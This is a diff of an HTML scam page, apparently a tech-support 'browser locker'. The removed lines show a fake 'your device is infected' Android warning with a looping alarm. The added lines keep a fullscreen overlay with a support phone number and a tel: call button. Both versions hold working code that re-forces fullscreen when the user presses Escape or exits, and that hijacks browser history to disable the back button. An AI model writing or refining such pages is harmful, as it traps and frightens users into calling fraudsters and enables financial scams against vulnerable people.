@@ -11,7 +11,6 @@
     font-family: Arial, sans-serif;
   }
 
-  /* Fullscreen overlay popup */
   #popupOverlay {
     position: fixed;
     top: 0; left: 0; right: 0; bottom: 0;
@@ -26,23 +25,26 @@
     box-sizing: border-box;
     user-select: none;
     cursor: pointer;
-  }
-
-  #popupOverlay img {
-    width: 100px;
-    animation: shake 0.8s infinite;
-    margin-bottom: 20px;
+    text-align: center;
   }
 
   #popupOverlay h1 {
     font-size: 3rem;
     margin-bottom: 15px;
-    animation: flash 1.2s infinite;
   }
 
-  #popupOverlay p {
-    font-size: 1.3rem;
-    text-align: center;
+  #phoneNumber {
+    font-size: 2rem;
+    font-weight: bold;
+    background: black;
+    padding: 10px 20px;
+    border-radius: 10px;
+    user-select: text;
+    margin-bottom: 10px;
+  }
+
+  #supportText {
+    font-size: 1.5rem;
     margin-bottom: 30px;
   }
 
@@ -62,40 +64,20 @@
     background: #ff3b3b;
     color: black;
   }
-
-  /* Flash animation */
-  @keyframes flash {
-    0%, 100% {opacity: 1;}
-    50% {opacity: 0.3;}
-  }
-
-  /* Shake animation */
-  @keyframes shake {
-    0%, 100% {transform: translateX(0);}
-    25% {transform: translateX(-10px);}
-    75% {transform: translateX(10px);}
-  }
 </style>
 </head>
 <body>
 
-<div id="popupOverlay" aria-live="assertive" aria-atomic="true" role="alert" tabindex="0">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Android Logo" />
-  <h1>WARNING!</h1>
-  <p>Your device is infected with a virus.<br />Call Android Support immediately!</p>
-  <button id="callBtn" aria-label="Call Android Support">Call Android Support</button>
+<div id="popupOverlay" role="alert" aria-live="assertive" tabindex="0">
+  <h1>Important Support</h1>
+  <div id="phoneNumber">888-888-8888</div>
+  <div id="supportText">Call Support</div>
+  <button id="callBtn" aria-label="Call Support">Call Now</button>
 </div>
-
-<audio id="alertSound" loop>
-  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg" />
-  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.mp3" type="audio/mpeg" />
-  Your browser does not support the audio element.
-</audio>
 
 <script>
   const popupOverlay = document.getElementById('popupOverlay');
   const callBtn = document.getElementById('callBtn');
-  const alertSound = document.getElementById('alertSound');
 
   // Function to request fullscreen
   async function enterFullscreen() {
@@ -109,39 +91,41 @@
     }
   }
 
-  // Play alert sound and enter fullscreen on any click on popup overlay
+  // On any click on popupOverlay, enter fullscreen
   popupOverlay.addEventListener('click', async () => {
     await enterFullscreen();
-    if(alertSound.paused) alertSound.play().catch(() => {});
   });
 
   // Call button opens dialer
   callBtn.addEventListener('click', (e) => {
-    e.stopPropagation(); // prevent triggering fullscreen again
+    e.stopPropagation(); // prevent fullscreen toggle
     window.location.href = "tel:8888888888";
   });
 
-  // Play sound immediately (some browsers restrict autoplay but user clicked popup so allowed)
-  alertSound.play().catch(() => {});
+  // Prevent back navigation by pushing state repeatedly
+  function disableBack() {
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.go(1);
+    };
+  }
+  disableBack();
 
-  // Prevent back navigation by pushing state
-  history.pushState(null, null, location.href);
-  window.onpopstate = function () {
-    history.go(1);
-  };
-
-  // Try to re-enter fullscreen if user exits
+  // Also disable back button when fullscreen changes
   document.addEventListener('fullscreenchange', () => {
     if (!document.fullscreenElement) {
+      // If fullscreen is exited, try to enter again and disable back
       enterFullscreen();
+      disableBack();
     }
   });
 
-  // Prevent ESC key from exiting fullscreen (not foolproof)
+  // Prevent ESC key to exit fullscreen
   window.addEventListener('keydown', e => {
     if (e.key === 'Escape') {
       e.preventDefault();
       enterFullscreen();
+      disableBack();
     }
   });
 </script>
